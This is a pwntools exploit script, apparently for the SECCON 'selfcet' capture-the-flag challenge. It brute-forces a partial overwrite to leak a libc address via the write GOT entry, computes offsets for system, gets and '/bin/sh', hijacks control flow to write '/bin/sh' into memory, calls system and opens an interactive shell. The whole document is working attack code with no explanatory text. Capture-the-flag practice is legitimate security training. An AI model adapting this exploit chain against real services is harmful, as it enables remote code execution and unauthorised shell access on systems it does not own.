from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './xor'
HOST = '172.17.0.3'
HOST = 'selfcet.seccon.games'
PORT = 9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

while (1):
    r = start()
    if args.D:
	    debug(r, [0x1181])

    payload =b''
    #payload += flat(0x111, 0x222, 0x333, 0x444, 0x555, 0x666, 0x777, 0x888, 0x999, 0xaaaa, 0xbbbb)
    # aaaa: status, 0x9999: error, 0xbbbb: throw
    payload += flat(0x111, 0x222, 0x333, 0x444, 0x555, 0x666, 0x777, 0x888, 0x401000, elf.got.write)#, 0x401000)#, 0xbbbb)
    if args.R:
        payload += b'\x40\x6f' # 1/16
    else:
        payload += b'\x40\x0f' # 1/16
    #pause()
    r.send(payload)
    try:
        if args.R:
            #r.recvuntil(b'chal: ')
            r.recvuntil(b'xor: ')
        else:
            r.recvuntil(b'xor: ')
        break
    except:
        pass
    r.close()
leak = u64(r.recvuntil(b': ', True).ljust(8, b'\x00'))
dbg('leak')
pause()

ld = 0x400318
leave = 0x004012ac
ret = leave+1

base = leak - 0x114a20
system = base + 0x50d60
binsh = base + 0x1d8698
start = base + 0x29d10
memset = base + 0xa9750
canary = base - 0x2898
mprotect = base + 0x11ec50
read = base + 0x114980
gmtime_r = base + 0xd8f80
modf = base + 0x41440
ctime = base + 0xd8ee0
asctime_r = base + 0xd8c70
execvp = base + 0xeb660
strtod = base + 0x47fa0
strtof = base + 0x47f60
wcstod = base + 0xc6e90
signal = base + 0x42420
gets = base + 0x805a0

payload =b''
payload += flat(0x111, 0x222, 0x333, 0x444, elf.sym.main, 6, signal, 0x8888, 0x999, 0xaaaa, 0xbbbb)
# 4444: status, 0x5555: error, 0x7777: throw
r.send(payload)

payload =b''
payload += flat(0x111, 0x222, 0x333, 0x444, 0x555, 0x666, 0x777, 0x888, 0x401000, 0x404000, gets)
r.sendafter(b'terminated\n', payload)

sleep(1)
r.sendline(b'/bin/sh\x00')
sleep(1)

payload =b''
payload += flat(0x111, 0x222, 0x333, 0x444, 0x5555, 0x404000, system, 0x8888, 0x999, 0xaaaa, 0xbbbb)
# 4444: status, 0x5555: error, 0x7777: throw
r.send(payload)
r.interactive()
r.close()
